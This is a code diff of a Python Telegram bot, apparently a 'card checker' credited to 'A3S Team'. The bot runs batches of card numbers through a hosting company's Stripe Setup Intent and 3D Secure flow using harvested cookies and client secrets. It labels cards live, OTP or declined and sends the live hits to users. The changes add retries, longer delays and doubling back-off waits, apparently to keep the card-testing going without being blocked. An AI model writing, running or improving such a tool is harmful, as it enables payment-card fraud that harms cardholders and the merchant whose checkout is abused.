@@ -31,11 +31,10 @@ def luhn_check(card_number):
     checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
     return checksum % 10 == 0
 
-# فحص BIN بسيط (للتأكد إن الكارت Visa أو MasterCard)
+# فحص BIN (Visa: يبدأ بـ 4، MasterCard: يبدأ بـ 51-55)
 def is_valid_bin(card_number):
     bin = card_number[:6]
-    # أمثلة لـ BIN مدعوم (Visa يبدأ بـ 4، MasterCard بـ 5)
-    return bin.startswith(('4', '5'))
+    return bin.startswith('4') or bin.startswith(('51', '52', '53', '54', '55'))
 
 # رأس الطلبات للموقع
 cookies = {
@@ -89,6 +88,7 @@ class StripeChecker:
         for attempt in range(3):
             try:
                 response = requests.get('https://cp.altushost.com/', params=params, cookies=cookies, headers=headers)
+                response.raise_for_status()
                 soup = BeautifulSoup(response.text, "html.parser")
                 script_tags = soup.find_all("script")
                 
@@ -117,14 +117,14 @@ class StripeChecker:
                 return False
 
     def check_card(self, card: Dict, retry_count: int = 0) -> Dict:
-        time.sleep(1.5)
+        time.sleep(2)  # تأخير قبل كل فحص
         start_time = time.time()
 
         if not luhn_check(card['number']):
             return {
                 'status': 'ERROR',
                 'message': 'Invalid card number (Luhn check failed)',
-                'details': {},
+                'details': {'status_3ds': 'N/A'},
                 'time': round(time.time() - start_time, 2)
             }
 
@@ -132,10 +132,11 @@ class StripeChecker:
             return {
                 'status': 'DECLINED',
                 'message': '❌ Unsupported card type (BIN not Visa/MasterCard)',
-                'details': {},
+                'details': {'status_3ds': 'N/A'},
                 'time': round(time.time() - start_time, 2)
             }
 
+        # جلب client_secret جديد قبل كل فحص
         if not self.fetch_stripe_keys():
             if retry_count < 2:
                 time.sleep(2)
@@ -143,7 +144,7 @@ class StripeChecker:
             return {
                 'status': 'ERROR',
                 'message': 'Failed to fetch valid client_secret',
-                'details': {},
+                'details': {'status_3ds': 'N/A'},
                 'time': round(time.time() - start_time, 2)
             }
 
@@ -166,7 +167,7 @@ class StripeChecker:
                     return {
                         'status': 'ERROR',
                         'message': f'Setup Intent Error - {str(e)}',
-                        'details': {},
+                        'details': {'status_3ds': 'N/A'},
                         'time': round(time.time() - start_time, 2)
                     }
 
@@ -176,13 +177,13 @@ class StripeChecker:
                     return {
                         'status': 'DECLINED',
                         'message': '❌ 3D Secure 2 Not Supported',
-                        'details': {},
+                        'details': {'status_3ds': 'N/A'},
                         'time': round(time.time() - start_time, 2)
                     }
                 return {
                     'status': 'ERROR',
                     'message': f'Setup Intent Error - {error_message}',
-                    'details': {},
+                    'details': {'status_3ds': 'N/A'},
                     'time': round(time.time() - start_time, 2)
                 }
 
@@ -203,7 +204,7 @@ class StripeChecker:
                         return {
                             'status': 'ERROR',
                             'message': f'3DS2 Authentication Error - {str(e)}',
-                            'details': {},
+                            'details': {'status_3ds': 'N/A'},
                             'time': round(time.time() - start_time, 2)
                         }
 
@@ -233,9 +234,12 @@ class StripeChecker:
                         'time': round(time.time() - start_time, 2)
                     }
                 else:
+                    if retry_count < 1:  # إعادة محاولة مرة واحدة إذا كان N/A
+                        time.sleep(2)
+                        return self.check_card(card, retry_count + 1)
                     return {
                         'status': 'ERROR',
-                        'message': f'❔ Unknown Status: {trans_status}',
+                        'message': f'❔ Unknown 3DS Status: {trans_status or "N/A"}',
                         'details': details,
                         'time': round(time.time() - start_time, 2)
                     }
@@ -248,6 +252,9 @@ class StripeChecker:
                         'details': details,
                         'time': round(time.time() - start_time, 2)
                     }
+                if retry_count < 1:  # إعادة محاولة مرة واحدة إذا فشل
+                    time.sleep(2)
+                    return self.check_card(card, retry_count + 1)
                 return {
                     'status': 'ERROR',
                     'message': 'Further Action Required or Setup Intent Failed',
@@ -255,10 +262,13 @@ class StripeChecker:
                     'time': round(time.time() - start_time, 2)
                 }
         except Exception as e:
+            if retry_count < 1:
+                time.sleep(2)
+                return self.check_card(card, retry_count + 1)
             return {
                 'status': 'ERROR',
                 'message': f'Error - {str(e)}',
-                'details': {},
+                'details': {'status_3ds': 'N/A'},
                 'time': round(time.time() - start_time, 2)
             }
 
@@ -391,70 +401,54 @@ def check_cards_thread(user_id, message):
     )
     
     checker = StripeChecker()
-    if not checker.fetch_stripe_keys():
-        bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=message.message_id,
-            text=f"""<b>⚠️ Failed to get authorization keys!
-━━━━━━━━━━━━━━━━━━━━
-⏳ Please try again after updating cookies.
-━━━━━━━━━━━━━━━━━━━━
-👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
-</b>"""
-        )
-        checking_status[user_id] = False
-        return
-    
-    live = otp = declined = errors = checked = refresh_count = 0
+    live = otp = declined = errors = checked = key_attempts = na_count = 0
+    wait_time = 60  # بداية الانتظار بدقيقة
     start_time = time.time()
-    card_count = 0  # عداد الكروت للتجديد كل 10
-    error_count = 0  # عداد الأخطاء للتجديد بعد 3 أخطاء متتالية
-    max_refreshes = 50000  # الحد الأقصى للتجديدات
     
     for card in cards:
         if not checking_status.get(user_id, True):
             break
         
         checked += 1
-        card_count += 1
         result = checker.check_card(card)
+        key_attempts += 1  # زيادة عداد محاولات جلب المفاتيح
         
-        # تجديد المفاتيح كل 10 كروت أو بعد 3 أخطاء متتالية
-        if card_count >= 10 or (result['status'] in ['ERROR', 'DECLINED'] and error_count >= 3):
-            if refresh_count >= max_refreshes:
-                bot.edit_message_text(
-                    chat_id=message.chat.id,
-                    message_id=message.message_id,
-                    text=f"""<b>⚠️ Max key refresh limit reached!
-━━━━━━━━━━━━━━━━━━━━
-⏳ Checking stopped. Please update cookies.
-━━━━━━━━━━━━━━━━━━━━
-👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
-</b>"""
-                )
-                checking_status[user_id] = False
-                return
-            if checker.fetch_stripe_keys():
-                card_count = 0
-                error_count = 0
-                refresh_count += 1
-            else:
-                bot.edit_message_text(
-                    chat_id=message.chat.id,
-                    message_id=message.message_id,
-                    text=f"""<b>⚠️ Failed to refresh keys!
-━━━━━━━━━━━━━━━━━━━━
-⏳ Checking stopped. Please update cookies.
-━━━━━━━━━━━━━━━━━━━━
-👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
-</b>"""
-                )
-                checking_status[user_id] = False
-                return
-        
-        # إنشاء زر لعرض نتيجة الفحص مع الـ status_3ds
-        keyboard = types.InlineKeyboardMarkup(row_width=1)
+        # التحقق من N/A وإدارة الانتظار الديناميكي
         status_3ds = result.get('details', {}).get('status_3ds', 'N/A')
+        if status_3ds == 'N/A':
+            na_count += 1
+        else:
+            na_count = 0  # إعادة تعيين العداد لو الكارت مش N/A
+        
+        if na_count >= 5:
+            if wait_time > 3600:  # لو وصل لساعة
+                bot.edit_message_text(
+                    chat_id=message.chat.id,
+                    message_id=message.message_id,
+                    text=f"""<b>⚠️ Checking Stopped!
+━━━━━━━━━━━━━━━━━━━━
+📊 Reason: Max wait time reached (1 hour) with repeated N/A statuses
+━━━━━━━━━━━━━━━━━━━━
+👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
+</b>"""
+                )
+                checking_status[user_id] = False
+                return
+            bot.edit_message_text(
+                chat_id=message.chat.id,
+                message_id=message.message_id,
+                text=f"""<b>🔥 Gateway: Stripe 3DS
+━━━━━━━━━━━━━━━━━━━━
+⏳ Paused due to {na_count} consecutive N/A statuses...
+⏱ Waiting: {wait_time} seconds
+</b>"""
+            )
+            time.sleep(wait_time)
+            wait_time *= 2  # تضاعف وقت الانتظار
+            na_count = 0  # إعادة تعيين العداد بعد الانتظار
+        
+        # إنشاء زر لعرض نتيجة الفحص
+        keyboard = types.InlineKeyboardMarkup(row_width=1)
         callback_data = f"show_result_{checked}"
         keyboard.add(
             types.InlineKeyboardButton(f"📋|Status: {status_3ds}", callback_data=callback_data)
@@ -465,7 +459,9 @@ def check_cards_thread(user_id, message):
             types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
             types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
-            types.InlineKeyboardButton(f"• Refreshes 🔄 ➜ [{refresh_count}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Key Attempts 🔑 ➜ [{key_attempts}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• N/A Count ❔ ➜ [{na_count}] •", callback_data='x'),
+            types.InlineKeyboardButton(f"• Wait Time ⏱ ➜ [{wait_time}s] •", callback_data='x'),
             types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
         )
         
@@ -482,18 +478,14 @@ def check_cards_thread(user_id, message):
 👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
 </b>"""
             bot.send_message(user_id, msg)
-            error_count = 0
         elif result['status'] == 'OTP':
             otp += 1
-            error_count = 0
         elif result['status'] == 'DECLINED':
             declined += 1
-            error_count += 1
-            time.sleep(3)  # تأخير إضافي بعد DECLINED
+            time.sleep(5)  # تأخير إضافي بعد DECLINED
         else:
             errors += 1
-            error_count += 1
-            time.sleep(3)  # تأخير إضافي بعد ERROR
+            time.sleep(5)  # تأخير إضافي بعد ERROR
         
         # تخزين نتيجة الكرت
         user_cards[user_id][checked-1]['result'] = result
@@ -514,17 +506,27 @@ def check_cards_thread(user_id, message):
 {progress_bar}
 ⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
 💳 Current: {card['number'][:6]}...{card['number'][-4:]}
-🔄 Key Refreshes: {refresh_count}
+🔑 Key Attempts: {key_attempts}
+❔ N/A Count: {na_count}
+⏱ Wait Time: {wait_time}s
 </b>""",
                 reply_markup=keyboard
             )
         except:
             pass
         
-        time.sleep(0.5)
+        time.sleep(2)  # تأخير بين كل فحص
     
     # النتيجة النهائية
     total_time = time.time() - start_time
+    error_reason = "Completed successfully"
+    if not checking_status.get(user_id, True):
+        error_reason = "Stopped by user"
+    elif na_count >= 5 and wait_time > 3600:
+        error_reason = "Stopped due to repeated N/A statuses after max wait time"
+    elif errors > 0 and checked < total:
+        error_reason = "Stopped due to repeated errors or invalid keys"
+    
     bot.edit_message_text(
         chat_id=message.chat.id,
         message_id=message.message_id,
@@ -536,7 +538,10 @@ def check_cards_thread(user_id, message):
 ├ OTP 🔐: {otp}
 ├ Declined ❌: {declined}
 ├ Errors ⚠️: {errors}
-├ Key Refreshes 🔄: {refresh_count}
+├ Key Attempts 🔑: {key_attempts}
+├ Max N/A Count ❔: {na_count}
+├ Max Wait Time ⏱: {wait_time}s
+├ Reason: {error_reason}
 
 ⏱ Stats:
 ├ Time: {int(total_time)}s
